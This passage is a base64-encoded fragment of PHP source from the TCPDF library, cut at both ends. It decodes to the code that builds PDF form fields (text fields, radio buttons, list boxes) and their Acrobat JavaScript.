qc19vYmplY3RzKSkgewoJCQlmb3JlYWNoICgkdGhpcy0+anNfb2JqZWN0cyBhcyAka2V5ID0+ICR2YWwpIHsKCQkJCSRvdXQgPSAkdGhpcy0+X2dldG9iaigka2V5KS4iXG4iLicgPDwgL1MgL0phdmFTY3JpcHQgL0pTICcuJHRoaXMtPl90ZXh0c3RyaW5nKCR2YWxbJ2pzJ10sICRrZXkpLicgPj4nLiJcbiIuJ2VuZG9iaic7CgkJCQkkdGhpcy0+X291dCgkb3V0KTsKCQkJfQoJCX0KCX0KCgkvKioKCSAqIEFkZHMgYSBqYXZhc2NyaXB0IGZvcm0gZmllbGQuCgkgKiBAcGFyYW0gc3RyaW5nICR0eXBlIGZpZWxkIHR5cGUKCSAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgZmllbGQgbmFtZQoJICogQHBhcmFtIGludCAkeCBob3Jpem9udGFsIHBvc2l0aW9uCgkgKiBAcGFyYW0gaW50ICR5IHZlcnRpY2FsIHBvc2l0aW9uCgkgKiBAcGFyYW0gaW50ICR3IHdpZHRoCgkgKiBAcGFyYW0gaW50ICRoIGhlaWdodAoJICogQHBhcmFtIGFycmF5ICRwcm9wIGphdmFzY3JpcHQgZmllbGQgcHJvcGVydGllcy4gUG9zc2libGUgdmFsdWVzIGFyZSBkZXNjcmliZWQgb24gb2ZmaWNpYWwgSmF2YXNjcmlwdCBmb3IgQWNyb2JhdCBBUEkgcmVmZXJlbmNlLgoJICogQHByb3RlY3RlZAoJICogQGF1dGhvciBEZW5pcyBWYW4gTnVmZmVsZW4sIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDIuMS4wMDIgKDIwMDgtMDItMTIpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfYWRkZmllbGQoJHR5cGUsICRuYW1lLCAkeCwgJHksICR3LCAkaCwgJHByb3ApIHsKCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkkeCA9ICR4IC0gJHc7CgkJfQoJCS8vIHRoZSBmb2xsb3dpbmQgYXZvaWQgZmllbGRzIGR1cGxpY2F0aW9uIGFmdGVyIHNhdmluZyB0aGUgZG9jdW1lbnQKCQkkdGhpcy0+amF2YXNjcmlwdCAuPSAiaWYgKGdldEZpZWxkKCd0Y3BkZmRvY3NhdmVkJykudmFsdWUgIT0gJ3NhdmVkJykgeyI7CgkJJGsgPSAkdGhpcy0+azsKCQkkdGhpcy0+amF2YXNjcmlwdCAuPSBzcHJpbnRmKCJmIi4kbmFtZS4iPXRoaXMuYWRkRmllbGQoJyVzJywnJXMnLCV1LFslRiwlRiwlRiwlRl0pOyIsICRuYW1lLCAkdHlwZSwgJHRoaXMtPlBhZ2VObygpLTEsICR4KiRrLCAoJHRoaXMtPmgtJHkpKiRrKzEsICgkeCskdykqJGssICgkdGhpcy0+aC0keS0kaCkqJGsrMSkuIlxuIjsKCQkkdGhpcy0+amF2YXNjcmlwdCAuPSAnZicuJG5hbWUuJy50ZXh0U2l6ZT0nLiR0aGlzLT5Gb250U2l6ZVB0LiI7XG4iOwoJCWZvcmVhY2goJHByb3AgYXMgJGtleSA9PiAkdmFsKSB7CgkJCWlmIChzdHJjbXAoc3Vic3RyKCRrZXksIC01KSwgJ0NvbG9yJykgPT0gMCkgewoJCQkJJHZhbCA9IFRDUERGX0NPTE9SUzo6X0pTY29sb3IoJHZhbCk7CgkJCX0gZWxzZSB7CgkJCQkkdmFsID0gIiciLiR2YWwuIiciOwoJCQl9CgkJCSR0aGlzLT5qYXZhc2NyaXB0IC49ICdmJy4kbmFtZS4nLicuJGtleS4nPScuJHZhbC4iO1xuIjsKCQl9CgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJJHRoaXMtPnggLT0gJHc7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPnggKz0gJHc7CgkJfQoJCSR0aGlzLT5qYXZhc2NyaXB0IC49ICd9JzsKCX0KCgkvLyAtLS0gRk9STSBGSUVMRFMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCgoKCS8qKgoJICogU2V0IGRlZmF1bHQgcHJvcGVydGllcyBmb3IgZm9ybSBmaWVsZHMuCgkgKiBAcGFyYW0gYXJyYXkgJHByb3AgamF2YXNjcmlwdCBmaWVsZCBwcm9wZXJ0aWVzLiBQb3NzaWJsZSB2YWx1ZXMgYXJlIGRlc2NyaWJlZCBvbiBvZmZpY2lhbCBKYXZhc2NyaXB0IGZvciBBY3JvYmF0IEFQSSByZWZlcmVuY2UuCgkgKiBAcHVibGljCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDQuOC4wMDAgKDIwMDktMDktMDYpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRGb3JtRGVmYXVsdFByb3AoJHByb3A9YXJyYXkoKSkgewoJCSR0aGlzLT5kZWZhdWx0X2Zvcm1fcHJvcCA9ICRwcm9wOwoJfQoKCS8qKgoJICogUmV0dXJuIHRoZSBkZWZhdWx0IHByb3BlcnRpZXMgZm9yIGZvcm0gZmllbGRzLgoJICogQHJldHVybiBhcnJheSAkcHJvcCBqYXZhc2NyaXB0IGZpZWxkIHByb3BlcnRpZXMuIFBvc3NpYmxlIHZhbHVlcyBhcmUgZGVzY3JpYmVkIG9uIG9mZmljaWFsIEphdmFzY3JpcHQgZm9yIEFjcm9iYXQgQVBJIHJlZmVyZW5jZS4KCSAqIEBwdWJsaWMKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNC44LjAwMCAoMjAwOS0wOS0wNikKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldEZvcm1EZWZhdWx0UHJvcCgpIHsKCQlyZXR1cm4gJHRoaXMtPmRlZmF1bHRfZm9ybV9wcm9wOwoJfQoKCS8qKgoJICogQ3JlYXRlcyBhIHRleHQgZmllbGQKCSAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgZmllbGQgbmFtZQoJICogQHBhcmFtIGZsb2F0ICR3IFdpZHRoIG9mIHRoZSByZWN0YW5nbGUKCSAqIEBwYXJhbSBmbG9hdCAkaCBIZWlnaHQgb2YgdGhlIHJlY3RhbmdsZQoJICogQHBhcmFtIGFycmF5ICRwcm9wIGphdmFzY3JpcHQgZmllbGQgcHJvcGVydGllcy4gUG9zc2libGUgdmFsdWVzIGFyZSBkZXNjcmliZWQgb24gb2ZmaWNpYWwgSmF2YXNjcmlwdCBmb3IgQWNyb2JhdCBBUEkgcmVmZXJlbmNlLgoJICogQHBhcmFtIGFycmF5ICRvcHQgYW5ub3RhdGlvbiBwYXJhbWV0ZXJzLiBQb3NzaWJsZSB2YWx1ZXMgYXJlIGRlc2NyaWJlZCBvbiBvZmZpY2lhbCBQREYzMjAwMF8yMDA4IHJlZmVyZW5jZS4KCSAqIEBwYXJhbSBmbG9hdHxudWxsICR4IEFic2Npc3NhIG9mIHRoZSB1cHBlci1sZWZ0IGNvcm5lciBvZiB0aGUgcmVjdGFuZ2xlCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeSBPcmRpbmF0ZSBvZiB0aGUgdXBwZXItbGVmdCBjb3JuZXIgb2YgdGhlIHJlY3RhbmdsZQoJICogQHBhcmFtIGJvb2xlYW4gJGpzIGlmIHRydWUgcHV0IHRoZSBmaWVsZCB1c2luZyBKYXZhU2NyaXB0IChyZXF1aXJlcyBBY3JvYmF0IFdyaXRlciB0byBiZSByZW5kZXJlZCkuCgkgKiBAcHVibGljCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDQuOC4wMDAgKDIwMDktMDktMDcpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBUZXh0RmllbGQoJG5hbWUsICR3LCAkaCwgJHByb3A9YXJyYXkoKSwgJG9wdD1hcnJheSgpLCAkeD1udWxsLCAkeT1udWxsLCAkanM9ZmFsc2UpIHsKCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHgpKSB7CgkJCSR4ID0gJHRoaXMtPng7CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkeSkpIHsKCQkJJHkgPSAkdGhpcy0+eTsKCQl9CgkJLy8gY2hlY2sgcGFnZSBmb3Igbm8td3JpdGUgcmVnaW9ucyBhbmQgYWRhcHQgcGFnZSBtYXJnaW5zIGlmIG5lY2Vzc2FyeQoJCWxpc3QoJHgsICR5KSA9ICR0aGlzLT5jaGVja1BhZ2VSZWdpb25zKCRoLCAkeCwgJHkpOwoJCWlmICgkanMpIHsKCQkJJHRoaXMtPl9hZGRmaWVsZCgndGV4dCcsICRuYW1lLCAkeCwgJHksICR3LCAkaCwgJHByb3ApOwoJCQlyZXR1cm47CgkJfQoJCS8vIGdldCBkZWZhdWx0IHN0eWxlCgkJJHByb3AgPSBhcnJheV9tZXJnZSgkdGhpcy0+Z2V0Rm9ybURlZmF1bHRQcm9wKCksICRwcm9wKTsKCQkvLyBnZXQgYW5ub3RhdGlvbiBkYXRhCgkJJHBvcHQgPSBUQ1BERl9TVEFUSUM6OmdldEFubm90T3B0RnJvbUpTUHJvcCgkcHJvcCwgJHRoaXMtPnNwb3RfY29sb3JzLCAkdGhpcy0+cnRsKTsKCQkvLyBzZXQgZGVmYXVsdCBhcHBlYXJhbmNlIHN0cmVhbQoJCSR0aGlzLT5hbm5vdGF0aW9uX2ZvbnRzWyR0aGlzLT5DdXJyZW50Rm9udFsnZm9udGtleSddXSA9ICR0aGlzLT5DdXJyZW50Rm9udFsnaSddOwoJCSRmb250c3R5bGUgPSBzcHJpbnRmKCcvRiVkICVGIFRmICVzJywgJHRoaXMtPkN1cnJlbnRGb250WydpJ10sICR0aGlzLT5Gb250U2l6ZVB0LCAkdGhpcy0+VGV4dENvbG9yKTsKCQkkcG9wdFsnZGEnXSA9ICRmb250c3R5bGU7CgkJLy8gYnVpbGQgYXBwZWFyYW5jZSBzdHJlYW0KCQkkcG9wdFsnYXAnXSA9IGFycmF5KCk7CgkJJHBvcHRbJ2FwJ11bJ24nXSA9ICcvVHggQk1DIHEgJy4kZm9udHN0eWxlLicgJzsKCQkkdGV4dCA9ICcnOwoJCWlmIChpc3NldCgkcHJvcFsndmFsdWUnXSkgQU5EICFlbXB0eSgkcHJvcFsndmFsdWUnXSkpIHsKCQkJJHRleHQgPSAkcHJvcFsndmFsdWUnXTsKCQl9IGVsc2VpZiAoaXNzZXQoJG9wdFsndiddKSBBTkQgIWVtcHR5KCRvcHRbJ3YnXSkpIHsKCQkJJHRleHQgPSAkb3B0Wyd2J107CgkJfQoJCSR0bXBpZCA9ICR0aGlzLT5zdGFydFRlbXBsYXRlKCR3LCAkaCwgZmFsc2UpOwoJCSRhbGlnbiA9ICcnOwoJCWlmIChpc3NldCgkcG9wdFsncSddKSkgewoJCQlzd2l0Y2ggKCRwb3B0WydxJ10pIHsKCQkJCWNhc2UgMDogewoJCQkJCSRhbGlnbiA9ICdMJzsKCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgMTogewoJCQkJCSRhbGlnbiA9ICdDJzsKCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgMjogewoJCQkJCSRhbGlnbiA9ICdSJzsKCQkJCQlicmVhazsKCQkJCX0KCQkJCWRlZmF1bHQ6IHsKCQkJCQkkYWxpZ24gPSAnJzsKCQkJCQlicmVhazsKCQkJCX0KCQkJfQoJCX0KCQkkdGhpcy0+TXVsdGlDZWxsKCR3LCAkaCwgJHRleHQsIDAsICRhbGlnbiwgZmFsc2UsIDAsIDAsIDAsIHRydWUsIDAsIGZhbHNlLCB0cnVlLCAwLCAnVCcsIGZhbHNlKTsKCQkkdGhpcy0+ZW5kVGVtcGxhdGUoKTsKCQktLSR0aGlzLT5uOwoJCSRwb3B0WydhcCddWyduJ10gLj0gJHRoaXMtPnhvYmplY3RzWyR0bXBpZF1bJ291dGRhdGEnXTsKCQl1bnNldCgkdGhpcy0+eG9iamVjdHNbJHRtcGlkXSk7CgkJJHBvcHRbJ2FwJ11bJ24nXSAuPSAnUSBFTUMnOwoJCS8vIG1lcmdlIG9wdGlvbnMKCQkkb3B0ID0gYXJyYXlfbWVyZ2UoJHBvcHQsICRvcHQpOwoJCS8vIHJlbW92ZSBzb21lIGNvbmZsaWN0aW5nIG9wdGlvbnMKCQl1bnNldCgkb3B0WydicyddKTsKCQkvLyBzZXQgcmVtYWluaW5nIGFubm90YXRpb24gZGF0YQoJCSRvcHRbJ1N1YnR5cGUnXSA9ICdXaWRnZXQnOwoJCSRvcHRbJ2Z0J10gPSAnVHgnOwoJCSRvcHRbJ3QnXSA9ICRuYW1lOwoJCS8vIEFkZGl0aW9uYWwgYW5ub3RhdGlvbidzIHBhcmFtZXRlcnMgKGNoZWNrIF9wdXRhbm5vdHNvYmooKSBtZXRob2QpOgoJCS8vJG9wdFsnZiddCgkJLy8kb3B0WydhcyddCgkJLy8kb3B0WydicyddCgkJLy8kb3B0WydiZSddCgkJLy8kb3B0WydjJ10KCQkvLyRvcHRbJ2JvcmRlciddCgkJLy8kb3B0WydoJ10KCQkvLyRvcHRbJ21rJ107CgkJLy8kb3B0WydtayddWydyJ10KCQkvLyRvcHRbJ21rJ11bJ2JjJ107CgkJLy8kb3B0WydtayddWydiZyddOwoJCXVuc2V0KCRvcHRbJ21rJ11bJ2NhJ10pOwoJCXVuc2V0KCRvcHRbJ21rJ11bJ3JjJ10pOwoJCXVuc2V0KCRvcHRbJ21rJ11bJ2FjJ10pOwoJCXVuc2V0KCRvcHRbJ21rJ11bJ2knXSk7CgkJdW5zZXQoJG9wdFsnbWsnXVsncmknXSk7CgkJdW5zZXQoJG9wdFsnbWsnXVsnaXgnXSk7CgkJdW5zZXQoJG9wdFsnbWsnXVsnaWYnXSk7CgkJLy8kb3B0WydtayddWydpZiddWydzdyddOwoJCS8vJG9wdFsnbWsnXVsnaWYnXVsncyddOwoJCS8vJG9wdFsnbWsnXVsnaWYnXVsnYSddOwoJCS8vJG9wdFsnbWsnXVsnaWYnXVsnZmInXTsKCQl1bnNldCgkb3B0WydtayddWyd0cCddKTsKCQkvLyRvcHRbJ3R1J10KCQkvLyRvcHRbJ3RtJ10KCQkvLyRvcHRbJ2ZmJ10KCQkvLyRvcHRbJ3YnXQoJCS8vJG9wdFsnZHYnXQoJCS8vJG9wdFsnYSddCgkJLy8kb3B0WydhYSddCgkJLy8kb3B0WydxJ10KCQkkdGhpcy0+QW5ub3RhdGlvbigkeCwgJHksICR3LCAkaCwgJG5hbWUsICRvcHQsIDApOwoJCWlmICgkdGhpcy0+cnRsKSB7CgkJCSR0aGlzLT54IC09ICR3OwoJCX0gZWxzZSB7CgkJCSR0aGlzLT54ICs9ICR3OwoJCX0KCX0KCgkvKioKCSAqIENyZWF0ZXMgYSBSYWRpb0J1dHRvbiBmaWVsZC4KCSAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgRmllbGQgbmFtZS4KCSAqIEBwYXJhbSBpbnQgJHcgV2lkdGggb2YgdGhlIHJhZGlvIGJ1dHRvbi4KCSAqIEBwYXJhbSBhcnJheSAkcHJvcCBKYXZhc2NyaXB0IGZpZWxkIHByb3BlcnRpZXMuIFBvc3NpYmxlIHZhbHVlcyBhcmUgZGVzY3JpYmVkIG9uIG9mZmljaWFsIEphdmFzY3JpcHQgZm9yIEFjcm9iYXQgQVBJIHJlZmVyZW5jZS4KCSAqIEBwYXJhbSBhcnJheSAkb3B0IEFubm90YXRpb24gcGFyYW1ldGVycy4gUG9zc2libGUgdmFsdWVzIGFyZSBkZXNjcmliZWQgb24gb2ZmaWNpYWwgUERGMzIwMDBfMjAwOCByZWZlcmVuY2UuCgkgKiBAcGFyYW0gc3RyaW5nICRvbnZhbHVlIFZhbHVlIHRvIGJlIHJldHVybmVkIGlmIHNlbGVjdGVkLgoJICogQHBhcmFtIGJvb2xlYW4gJGNoZWNrZWQgRGVmaW5lIHRoZSBpbml0aWFsIHN0YXRlLgoJICogQHBhcmFtIGZsb2F0fG51bGwgJHggQWJzY2lzc2Egb2YgdGhlIHVwcGVyLWxlZnQgY29ybmVyIG9mIHRoZSByZWN0YW5nbGUKCSAqIEBwYXJhbSBmbG9hdHxudWxsICR5IE9yZGluYXRlIG9mIHRoZSB1cHBlci1sZWZ0IGNvcm5lciBvZiB0aGUgcmVjdGFuZ2xlCgkgKiBAcGFyYW0gYm9vbGVhbiAkanMgSWYgdHJ1ZSBwdXQgdGhlIGZpZWxkIHVzaW5nIEphdmFTY3JpcHQgKHJlcXVpcmVzIEFjcm9iYXQgV3JpdGVyIHRvIGJlIHJlbmRlcmVkKS4KCSAqIEBwdWJsaWMKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNC44LjAwMCAoMjAwOS0wOS0wNykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFJhZGlvQnV0dG9uKCRuYW1lLCAkdywgJHByb3A9YXJyYXkoKSwgJG9wdD1hcnJheSgpLCAkb252YWx1ZT0nT24nLCAkY2hlY2tlZD1mYWxzZSwgJHg9bnVsbCwgJHk9bnVsbCwgJGpzPWZhbHNlKSB7CgkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR4KSkgewoJCQkkeCA9ICR0aGlzLT54OwoJCX0KCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHkpKSB7CgkJCSR5ID0gJHRoaXMtPnk7CgkJfQoJCS8vIGNoZWNrIHBhZ2UgZm9yIG5vLXdyaXRlIHJlZ2lvbnMgYW5kIGFkYXB0IHBhZ2UgbWFyZ2lucyBpZiBuZWNlc3NhcnkKCQlsaXN0KCR4LCAkeSkgPSAkdGhpcy0+Y2hlY2tQYWdlUmVnaW9ucygkdywgJHgsICR5KTsKCQlpZiAoJGpzKSB7CgkJCSR0aGlzLT5fYWRkZmllbGQoJ3JhZGlvYnV0dG9uJywgJG5hbWUsICR4LCAkeSwgJHcsICR3LCAkcHJvcCk7CgkJCXJldHVybjsKCQl9CgkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRvbnZhbHVlKSkgewoJCQkkb252YWx1ZSA9ICdPbic7CgkJfQoJCWlmICgkY2hlY2tlZCkgewoJCQkkZGVmdmFsID0gJG9udmFsdWU7CgkJfSBlbHNlIHsKCQkJJGRlZnZhbCA9ICdPZmYnOwoJCX0KCQkvLyBzZXQgZm9udAoJCSRmb250ID0gJ3phcGZkaW5nYmF0cyc7CgkJaWYgKCR0aGlzLT5wZGZhX21vZGUpIHsKCQkJLy8gYWxsIGZvbnRzIG11c3QgYmUgZW1iZWRkZWQKCQkJJGZvbnQgPSAncGRmYScuJGZvbnQ7CgkJfQoJCSR0aGlzLT5BZGRGb250KCRmb250KTsKCQkkdG1wZm9udCA9ICR0aGlzLT5nZXRGb250QnVmZmVyKCRmb250KTsKCQkvLyBzZXQgZGF0YSBmb3IgcGFyZW50IGdyb3VwCgkJaWYgKCFpc3NldCgkdGhpcy0+cmFkaW9idXR0b25fZ3JvdXBzWyR0aGlzLT5wYWdlXSkpIHsKCQkJJHRoaXMtPnJhZGlvYnV0dG9uX2dyb3Vwc1skdGhpcy0+cGFnZV0gPSBhcnJheSgpOwoJCX0KCQlpZiAoIWlzc2V0KCR0aGlzLT5yYWRpb2J1dHRvbl9ncm91cHNbJHRoaXMtPnBhZ2VdWyRuYW1lXSkpIHsKCQkJJHRoaXMtPnJhZGlvYnV0dG9uX2dyb3Vwc1skdGhpcy0+cGFnZV1bJG5hbWVdID0gYXJyYXkoKTsKCQkJKyskdGhpcy0+bjsKCQkJJHRoaXMtPnJhZGlvYnV0dG9uX2dyb3Vwc1skdGhpcy0+cGFnZV1bJG5hbWVdWyduJ10gPSAkdGhpcy0+bjsKCQkJJHRoaXMtPnJhZGlvX2dyb3Vwc1tdID0gJHRoaXMtPm47CgkJfQoJCSRraWQgPSAoJHRoaXMtPm4gKyAxKTsKCQkvLyBzYXZlIG9iamVjdCBJRCB0byBiZSBhZGRlZCBvbiBLaWRzIGVudHJ5IG9uIHBhcmVudCBvYmplY3QKCQkkdGhpcy0+cmFkaW9idXR0b25fZ3JvdXBzWyR0aGlzLT5wYWdlXVskbmFtZV1bXSA9IGFycmF5KCdraWQnID0+ICRraWQsICdkZWYnID0+ICRkZWZ2YWwpOwoJCS8vIGdldCBkZWZhdWx0IHN0eWxlCgkJJHByb3AgPSBhcnJheV9tZXJnZSgkdGhpcy0+Z2V0Rm9ybURlZmF1bHRQcm9wKCksICRwcm9wKTsKCQkkcHJvcFsnTm9Ub2dnbGVUb09mZiddID0gJ3RydWUnOwoJCSRwcm9wWydSYWRpbyddID0gJ3RydWUnOwoJCSRwcm9wWydib3JkZXJTdHlsZSddID0gJ2luc2V0JzsKCQkvLyBnZXQgYW5ub3RhdGlvbiBkYXRhCgkJJHBvcHQgPSBUQ1BERl9TVEFUSUM6OmdldEFubm90T3B0RnJvbUpTUHJvcCgkcHJvcCwgJHRoaXMtPnNwb3RfY29sb3JzLCAkdGhpcy0+cnRsKTsKCQkvLyBzZXQgYWRkaXRpb25hbCBkZWZhdWx0IG9wdGlvbnMKCQkkdGhpcy0+YW5ub3RhdGlvbl9mb250c1skdG1wZm9udFsnZm9udGtleSddXSA9ICR0bXBmb250WydpJ107CgkJJGZvbnRzdHlsZSA9IHNwcmludGYoJy9GJWQgJUYgVGYgJXMnLCAkdG1wZm9udFsnaSddLCAkdGhpcy0+Rm9udFNpemVQdCwgJHRoaXMtPlRleHRDb2xvcik7CgkJJHBvcHRbJ2RhJ10gPSAkZm9udHN0eWxlOwoJCS8vIGJ1aWxkIGFwcGVhcmFuY2Ugc3RyZWFtCgkJJHBvcHRbJ2FwJ10gPSBhcnJheSgpOwoJCSRwb3B0WydhcCddWyduJ10gPSBhcnJheSgpOwoJCSRmeCA9ICgoKCR3IC0gJHRoaXMtPmdldEFic0ZvbnRNZWFzdXJlKCR0bXBmb250WydjdyddWzEwOF0pKSAvIDIpICogJHRoaXMtPmspOwoJCSRmeSA9ICgoJHcgLSAoKCgkdG1wZm9udFsnZGVzYyddWydBc2NlbnQnXSAtICR0bXBmb250WydkZXNjJ11bJ0Rlc2NlbnQnXSkgKiAkdGhpcy0+Rm9udFNpemVQdCAvIDEwMDApIC8gJHRoaXMtPmspKSAqICR0aGlzLT5rKTsKCQkkcG9wdFsnYXAnXVsnbiddWyRvbnZhbHVlXSA9IHNwcmludGYoJ3EgJXMgQlQgL0YlZCAlRiBUZiAlRiAlRiBUZCAoJy5jaHIoMTA4KS4nKSBUaiBFVCBRJywgJHRoaXMtPlRleHRDb2xvciwgJHRtcGZvbnRbJ2knXSwgJHRoaXMtPkZvbnRTaXplUHQsICRmeCwgJGZ5KTsKCQkkcG9wdFsnYXAnXVsnbiddWydPZmYnXSA9IHNwcmludGYoJ3EgJXMgQlQgL0YlZCAlRiBUZiAlRiAlRiBUZCAoJy5jaHIoMTA5KS4nKSBUaiBFVCBRJywgJHRoaXMtPlRleHRDb2xvciwgJHRtcGZvbnRbJ2knXSwgJHRoaXMtPkZvbnRTaXplUHQsICRmeCwgJGZ5KTsKCQlpZiAoIWlzc2V0KCRwb3B0WydtayddKSkgewoJCQkkcG9wdFsnbWsnXSA9IGFycmF5KCk7CgkJfQoJCSRwb3B0WydtayddWydjYSddID0gJyhsKSc7CgkJLy8gbWVyZ2Ugb3B0aW9ucwoJCSRvcHQgPSBhcnJheV9tZXJnZSgkcG9wdCwgJG9wdCk7CgkJLy8gc2V0IHJlbWFpbmluZyBhbm5vdGF0aW9uIGRhdGEKCQkkb3B0WydTdWJ0eXBlJ10gPSAnV2lkZ2V0JzsKCQkkb3B0WydmdCddID0gJ0J0bic7CgkJaWYgKCRjaGVja2VkKSB7CgkJCSRvcHRbJ3YnXSA9IGFycmF5KCcvJy4kb252YWx1ZSk7CgkJCSRvcHRbJ2FzJ10gPSAkb252YWx1ZTsKCQl9IGVsc2UgewoJCQkkb3B0WydhcyddID0gJ09mZic7CgkJfQoJCS8vIHN0b3JlIHJlYWRvbmx5IGZsYWcKCQlpZiAoIWlzc2V0KCR0aGlzLT5yYWRpb2J1dHRvbl9ncm91cHNbJHRoaXMtPnBhZ2VdWyRuYW1lXVsnI3JlYWRvbmx5IyddKSkgewoJCQkkdGhpcy0+cmFkaW9idXR0b25fZ3JvdXBzWyR0aGlzLT5wYWdlXVskbmFtZV1bJyNyZWFkb25seSMnXSA9IGZhbHNlOwoJCX0KCQkkdGhpcy0+cmFkaW9idXR0b25fZ3JvdXBzWyR0aGlzLT5wYWdlXVskbmFtZV1bJyNyZWFkb25seSMnXSB8PSAoJG9wdFsnZiddICYgNjQpOwoJCSR0aGlzLT5Bbm5vdGF0aW9uKCR4LCAkeSwgJHcsICR3LCAkbmFtZSwgJG9wdCwgMCk7CgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJJHRoaXMtPnggLT0gJHc7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPnggKz0gJHc7CgkJfQoJfQoKCS8qKgoJICogQ3JlYXRlcyBhIExpc3QtYm94IGZpZWxkCgkgKiBAcGFyYW0gc3RyaW5nICRuYW1lIGZpZWxkIG5hbWUKCSAqIEBwYXJhbSBpbnQgJHcgd2lkdGgKCSAqIEBwYXJhbSBpbnQgJGggaGVpZ2h0CgkgKiBAcGFyYW0gYXJyYXkgJHZhbHVlcyBhcnJheSBjb250YWluaW5nIHRoZSBsaXN0IG9mIHZhbHVlcy4KCSAqIEBwYXJhbSBhcnJheSAkcHJvcCBqYXZhc2NyaXB0IGZpZWxkIHByb3BlcnRpZXMuIFBvc3NpYmxlIHZhbHVlcyBhcmUgZGVzY3JpYmVkIG9uIG9mZmljaWFsIEphdmFzY3JpcHQgZm9yIEFjcm9iYXQgQVBJIHJlZmVyZW5jZS4KCSAqIEBwYXJhbSBhcnJheSAkb3B0IGFubm90YXRpb24gcGFyYW1ldGVycy4gUG9zc2libGUgdmFsdWVzIGFyZSBkZXNjcmliZWQgb24gb2ZmaWNpYWwgUERGMzIwMDBfMjAwOCByZWZlcmVuY2UuCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeCBBYnNjaXNzYSBvZiB0aGUgdXBwZXItbGVmdCBjb3JuZXIgb2YgdGhlIHJlY3RhbmdsZQoJICogQHBhcmFtIGZsb2F0fG51bGwgJHkgT3JkaW5hdGUgb2YgdGhlIHVwcGVyLWxlZnQgY29ybmVyIG9mIHRoZSByZWN0YW5nbGUKCSAqIEBwYXJhbSBib29sZWFuICRqcyBpZiB0cnVlIHB1dCB0aGUgZmllbGQgdXNpbmcgSmF2YVNjcmlwdCAocmVxdWlyZXMgQWNyb2JhdCBXcml0ZXIgdG8gYmUgcmVuZGVyZWQpLgoJICogQHB1YmxpYwoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSA0LjguMDAwICgyMDA5LTA5LTA3KQoJICovCglwdWJsaWMgZnVuY3Rpb24gTGlzdEJveCgkbmFtZSwgJHcsICRoLCAkdmFsdWVzLCAkcHJvcD1hcnJheSgpLCAkb3B0PWFycmF5KCksICR4PW51bGwsICR5PW51bGwsICRqcz1mYWxzZSkgewoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkeCkpIHsKCQkJJHggPSAkdGhpcy0+eDsKCQl9CgkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR5KSkgewoJCQkkeSA9ICR0aGlzLT55OwoJCX0KCQkvLyBjaGVjayBwYWdlIGZvciBuby13cml0ZSByZWdpb25zIGFuZCBhZGFwdCBwYWdlIG1hcmdpbnMgaWYgbmVjZXNzYXJ5CgkJbGlzdCgkeCwgJHkpID0gJHRoaXMtPmNoZWNrUGFnZVJlZ2lvbnMoJGgsICR4LCAkeSk7CgkJaWYgKCRqcykgewoJCQkkdGhpcy0+X2FkZGZpZWxkKCdsaXN0Ym94JywgJG5hbWUsICR4LCAkeSwgJHcsICRoLCAkcHJvcCk7CgkJCSRzID0gJyc7CgkJCWZvcmVhY2ggKCR2YWx1ZXMgYXMgJHZhbHVlKSB7CgkJCQlpZiAoaXNfYXJyYXkoJHZhbHVlKSkgewoJCQkJCSRzIC49ICcsW1wnJy5hZGRzbGFzaGVzKCR2YWx1ZVsxXSkuJ1wnLFwnJy5hZGRzbGFzaGVzKCR2YWx1ZVswXSkuJ1wnXSc7CgkJCQl9IGVsc2UgewoJCQkJCSRzIC49ICcsW1wnJy5hZGRzbGFzaGVzKCR2YWx1ZSkuJ1wnLFwnJy5hZGRzbGFzaGVzKCR2YWx1ZSkuJ1wnXSc7CgkJCQl9CgkJCX0KCQkJJHRoaXMtPmphdmFzY3JpcHQgLj0gJ2YnLiRuYW1lLicuc2V0SXRlbXMoJy5zdWJzdHIoJHMsIDEpLicpOycuIlxuIjsKCQkJcmV0dXJuOwoJCX0KCQkvLyBnZXQgZGVmYXVsdCBzdHlsZQoJCSRwcm9wID0gYXJyYXlfbWVyZ2UoJHRoaXMtPmdldEZvcm1EZWZhdWx0UHJvcCgpLCAkcHJvcCk7CgkJLy8gZ2V0IGFubm90YXRpb24gZGF0YQoJCSRwb3B0ID0gVENQREZfU1RBVElDOjpnZXRBbm5vdE9wdEZyb21KU1Byb3AoJHByb3AsICR0aGlzLT5zcG90X2NvbG9ycywgJHRoaXMtPnJ0bCk7CgkJLy8gc2V0IGFkZGl0aW9uYWwgZGVmYXVsdCB2YWx1ZXMKCQkkdGhpcy0+YW5ub3RhdGlvbl9mb250c1skdGhpcy0+Q3VycmVudEZvbnRbJ2ZvbnR